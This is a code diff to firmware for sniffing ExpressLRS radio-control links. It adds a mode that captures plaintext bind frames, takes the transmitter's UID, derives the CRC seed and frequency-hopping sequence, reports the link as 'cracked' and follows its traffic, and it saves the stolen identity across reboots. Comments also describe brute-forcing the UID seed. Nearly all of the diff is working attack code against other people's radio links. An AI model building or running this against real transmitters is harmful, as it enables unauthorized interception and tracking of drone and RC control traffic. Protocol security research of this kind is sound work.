@@ -73,8 +73,9 @@ static uint32_t g_int_t0, g_int_rx0, g_int_log_ms;
 // IQ). Sync-shaped frames are exported as sync_frame events (throttled);
 // LoRa frames validate via the self-seeded CRC14 (direct lock possible);
 // FLRC frames feed the uid45 seed brute (2^16 x 4 CRC24 variants).
-#define HARVEST_STEPS 6
+#define HARVEST_STEPS 7
 #define HARVEST_DWELL_MS 750u
+#define FASTLINK_MS 60000u
 static const sniffer_step_t g_harvest_steps[HARVEST_STEPS] = {
     { &ELRS_RATES_FLRC[0], false, false },  // FLRC 1000Hz (discovery)
     { &ELRS_RATES_FLRC[1], false, false },  // DVDA 500
@@ -82,9 +83,17 @@ static const sniffer_step_t g_harvest_steps[HARVEST_STEPS] = {
     { &ELRS_RATES_3X[2], false, false },    // LoRa 250 n
     { &ELRS_RATES_3X[2], true, false },     // LoRa 250 i
     { &ELRS_RATES_3X[0], false, false },    // LoRa 500 n
+    { &ELRS_RATES_3X[5], true, false },     // LoRa 50 i  <- bind parking
 };
-static bool g_harvest;
-static uint8_t g_harvest_idx;
+static const sniffer_step_t g_fastlink_steps[4] = {
+    { &ELRS_RATES_3X[2], false, false },    // LoRa 250 n
+    { &ELRS_RATES_3X[2], true, false },     // LoRa 250 i
+    { &ELRS_RATES_3X[0], false, false },    // LoRa 500 n
+    { &ELRS_RATES_3X[0], true, false },     // LoRa 500 i
+};
+static uint8_t g_mode; // 0 sweep, 1 harvest, 2 fastlink (uid_last retry)
+static uint32_t g_fastlink_t0;
+static uint8_t g_harvest_idx; // step within harvest/fastlink
 // sync_frame dedupe ring (per harvest cycle): recent (nonce, fhss)
 static uint8_t g_sf_ring[16][2];
 static uint8_t g_sf_n;
@@ -100,6 +109,8 @@ static uint8_t g_t0_nonce, g_t0_fhss;
 // pending uid2 survivor -> crack success
 static int16_t g_uid2_survivor;
 static uint8_t g_uid2_track_store[sizeof(elrs_uid2_track_t)];
+static bool g_bind_seen;
+static uint8_t g_bind_last[4];
 static uint32_t last_pkt_debug_ms;      // crc-ok pkt hex (2/s)
 static uint32_t last_rawpkt_ms;         // sync-classified raw hex (2/s)
 
@@ -441,13 +452,26 @@ static void emit_fingerprint(const char *band)
 // log prints an energy fingerprint per rate as the sweep runs.
 static void dwell_begin(uint8_t i)
 {
-    step_idx = i % sweep.count;
-    const sniffer_step_t &s = sweep.steps[step_idx];
+    const sniffer_step_t *sp;
+    if (g_mode == 1) {          // harvest
+        g_harvest_idx = i % HARVEST_STEPS;
+        sp = &g_harvest_steps[g_harvest_idx];
+        step_idx = 0;
+    } else if (g_mode == 2) {   // fastlink (uid_last retry)
+        g_harvest_idx = i % 4;
+        sp = &g_fastlink_steps[g_harvest_idx];
+        step_idx = 0;
+    } else {
+        step_idx = i % sweep.count;
+        sp = &sweep.steps[step_idx];
+    }
+    const sniffer_step_t &s = *sp;
     g_radio.apply(s, ELRS_2G4_SYNC_FREQ_HZ);
     g_radio.start_rx();
     step_entered_ms = millis();
     dwell_rssi_max = -128.0f;
-    dwell_len_ms = s.rate->flrc ? 4000 : DWELL_MIN_MS; // FLRC discovery base 4 s
+    dwell_len_ms = (g_mode != 0) ? HARVEST_DWELL_MS
+                                 : (s.rate->flrc ? 4000 : DWELL_MIN_MS);
     dwell_pkts = 0;
     dwell_rx = 0;
     dwell_first_pkt_ms = 0;
@@ -523,8 +547,9 @@ static void dwell_advance()
             // sweep pass complete -> alternate with a find-mode harvest
             // cycle (sync-frequency parking) before the next pass
             memset(g_hot, 0, sizeof(g_hot));
-            g_harvest = true;
-            Serial.println("{\"t\":\"event\",\"what\":\"harvest\",\"state\":\"start\"}");
+            g_mode = 1;
+            Serial.printf("{\"t\":\"event\",\"what\":\"harvest\",\"state\":\"start\",\"freq\":%lu}\n",
+                          (unsigned long)ELRS_2G4_SYNC_FREQ_HZ);
             dwell_begin(0);
             return;
         }
@@ -994,6 +1019,58 @@ static void report_radio_fault(const char *detail)
     snprintf(uist.rate, sizeof(uist.rate), "rf fault");
 }
 
+// ---- bind adoption + last-link persistence (round 7) ---------------------
+static void uid_last_store(const uint8_t uid2_5[4])
+{
+    Preferences pr;
+    if (pr.begin(PREF_NAMESPACE, false)) {
+        pr.putBytes("uidlast", uid2_5, 4);
+        pr.end();
+    }
+}
+
+static bool uid_last_load(uint8_t uid2_5[4])
+{
+    Preferences pr;
+    bool ok = false;
+    if (pr.begin(PREF_NAMESPACE, true)) {
+        ok = pr.getBytesLength("uidlast") == 4 &&
+             pr.getBytes("uidlast", uid2_5, 4) == 4;
+        pr.end();
+    }
+    return ok;
+}
+
+// A bind frame leaks UID[2..5] in plaintext: adopt immediately, program the
+// exact identity (CRC seed + FHSS from macSeed; LoRa needs no sync word),
+// start following, and persist as last-known link for fast reboots.
+static void bind_adopt(const uint8_t uid2_5[4], float rssi)
+{
+    if (g_bind_seen &&
+        memcmp(g_bind_last, uid2_5, 4) == 0) return; // same bind, already adopted
+    g_bind_seen = true;
+    memcpy(g_bind_last, uid2_5, 4);
+    g_uid[2] = uid2_5[0]; g_uid[3] = uid2_5[1];
+    g_uid[4] = uid2_5[2]; g_uid[5] = uid2_5[3];
+    dctx.uid3 = g_uid[3]; dctx.uid4 = g_uid[4]; dctx.uid5 = g_uid[5];
+    dctx.uid_known = true;
+    dctx.crc_init = elrs_crc_init_from_uid(g_uid[4], g_uid[5]);
+    dctx.crc_init_known = true;
+    g_uid2 = g_uid[2];
+    g_uid2_known = true;
+    elrs_fhss_build(mac_seed_with_uid2(g_uid2), g_seq);
+    uid_last_store(uid2_5);
+    Serial.printf("{\"t\":\"event\",\"what\":\"uid_found\",\"uid\":\"?? ?? %02x %02x %02x %02x\","
+                  "\"src\":\"bind\",\"freq\":%lu,\"rssi\":%d}\n",
+                  g_uid[2], g_uid[3], g_uid[4], g_uid[5],
+                  (unsigned long)uist.freq_hz, (int)rssi);
+    Serial.printf("{\"t\":\"event\",\"what\":\"uid\",\"src\":\"bind\",\"uid\":\"%02x %02x %02x %02x %02x %02x\"}\n",
+                  g_uid[0], g_uid[1], g_uid[2], g_uid[3], g_uid[4], g_uid[5]);
+    crack_emit("cracked");
+    emit_fingerprint("lora"); // bind rides the LoRa path
+    g_following = true; // follow from the next sync anchor
+}
+
 // ---- boot observability: first serial output, before ANY init ------------
 static void early_banner()
 {
@@ -1040,6 +1117,22 @@ void setup()
     elrs_decode_init(&dctx);
     sniffer_sweep_build(&sweep);
     load_bind_phrase(); // persisted phrase or "ExpressLRS" -> UID -> FLRC identity
+    {
+        uint8_t u[4];
+        if (uid_last_load(u)) {
+            g_uid[2] = u[0]; g_uid[3] = u[1]; g_uid[4] = u[2]; g_uid[5] = u[3];
+            dctx.uid3 = g_uid[3]; dctx.uid4 = g_uid[4]; dctx.uid5 = g_uid[5];
+            dctx.uid_known = true;
+            dctx.crc_init = elrs_crc_init_from_uid(g_uid[4], g_uid[5]);
+            dctx.crc_init_known = true;
+            g_uid2 = u[0];
+            g_uid2_known = true;
+            elrs_fhss_build(mac_seed_with_uid2(g_uid2), g_seq);
+            g_mode = 2;
+            g_fastlink_t0 = millis();
+            Serial.println("{\"t\":\"event\",\"what\":\"fastlink\",\"state\":\"start\"}");
+        }
+    }
 
     // OLED: bounded probe, splash only on success; driver from prefs
     // (default SH1106 — these panels ship interchangeably and mislabelled)
@@ -1291,7 +1384,7 @@ void loop()
                 case ELRS_PKT_SYNC:
                     n_sync++; dwell_sync++;
                     // ---- FIND MODE: sync-shaped frame on the sync channel ----
-                    if (g_harvest && !locked &&
+                    if (g_mode != 0 && !locked &&
                         pkt.sync.fhss_index == FHSS_SYNC_INDEX &&
                         pkt.sync.rate_index <= 9) {
                         // dedupe by (nonce, fhss) within the harvest cycle
@@ -1417,7 +1510,17 @@ void loop()
                     if (pkt.cls == ELRS_PKT_CLASS_CRC_OK) on_rc(pkt); // junk hardening: sticks only from validated
                     break;
                 default:
-                    n_msp++; dwell_msp++; break;
+                    n_msp++; dwell_msp++;
+                    // BIND HARVEST: a TX in bind mode broadcasts
+                    // [0x09, UID2..5] on the sync channel, LoRa 50Hz, IQ
+                    // inverted, CRC init 0 (tx_main.cpp SendUIDOverMSP).
+                    {
+                        uint8_t u[4];
+                        if (!g_uid2_known && elrs_bind_parse(buf, want, u)) {
+                            bind_adopt(u, rssi);
+                        }
+                    }
+                    break;
                 }
             }
         }
@@ -1452,14 +1555,22 @@ void loop()
                 }
             }
         }
-        if (!locked && g_harvest) {
-            // harvest cycle: fixed short dwells, no extensions/interferer
+        if (!locked && g_mode == 2 && millis() - g_fastlink_t0 > FASTLINK_MS) {
+            g_mode = 0; // fastlink retry window over -> full sweep
+            Serial.println("{\"t\":\"event\",\"what\":\"fastlink\",\"state\":\"end\"}");
+            dwell_begin(0);
+        }
+        if (!locked && g_mode != 0) {
+            // harvest/fastlink: fixed short dwells, no extensions/interferer
             if (millis() - step_entered_ms > dwell_len_ms) {
-                if (g_harvest_idx + 1 >= HARVEST_STEPS) {
-                    g_harvest = false;
-                    g_sf_n = 0;
-                    memset(g_hot, 0, sizeof(g_hot));
-                    dwell_begin(0);
+                uint8_t nsteps = (g_mode == 1) ? HARVEST_STEPS : 4;
+                if (g_harvest_idx + 1 >= nsteps) {
+                    if (g_mode == 1) {
+                        g_mode = 0;
+                        g_sf_n = 0;
+                        memset(g_hot, 0, sizeof(g_hot));
+                    }
+                    dwell_begin(0); // fastlink keeps cycling within its window
                 } else {
                     dwell_begin(g_harvest_idx + 1);
                 }
